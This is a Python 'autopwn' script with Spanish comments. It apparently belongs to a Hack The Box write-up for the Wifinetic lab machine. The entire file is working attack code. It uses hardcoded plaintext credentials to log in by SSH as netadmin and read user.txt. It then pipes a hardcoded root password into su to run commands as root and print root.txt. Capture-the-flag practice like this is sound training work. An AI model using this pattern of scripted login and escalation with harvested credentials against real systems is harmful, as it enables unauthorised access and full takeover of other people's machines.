#!/usr/bin/python3 
# https://mikerega7.github.io/htb-writeup-wifinetic/
from pwn import *
import time 
import paramiko
import sys 

def def_handler(sig, frame):
    print("\n\n[+] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def autopwn():
    p1 = log.progress("Conectando por SSH como el usuario netadmin")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect('10.10.11.247', port=22, username='netadmin', password='VeRyUniUqWiFIPasswrd1!')
    time.sleep(4)
    p1.success("Conectado correctamente")
    stdin, stdout, stderr = ssh.exec_command('whoami')
    output = stdout.read().decode()
    print(output)
    time.sleep(2)
    p2 = log.progress("Mostrando user.txt")
    stdin, stdout, stderr = ssh.exec_command('cat user.txt')
    output2 = stdout.read().decode()
    print(output2)
    p2.success("Listo")
    p3 = log.progress("Mostrando la root.txt")
    time.sleep(2)
    root_password = 'WhatIsRealAnDWhAtIsNot51121!'
    command = f'echo "{root_password}" | su - root -c whoami'
    stdin, stdout, stderr = ssh.exec_command(command)
    time.sleep(2)
    output3 = stdout.read().decode()
    print(output3)
    p3.success("Listo")
    time.sleep(2)
    command2 = f'su -c "cat root.txt" - root <<EOF\n{root_password}\nEOF\n'
    stdin, stdout, stderr = ssh.exec_command(command2)
    time.sleep(1)
    output4 = stdout.read().decode()
    print(output4)
    ssh.close()
if __name__ == '__main__':
    autopwn()
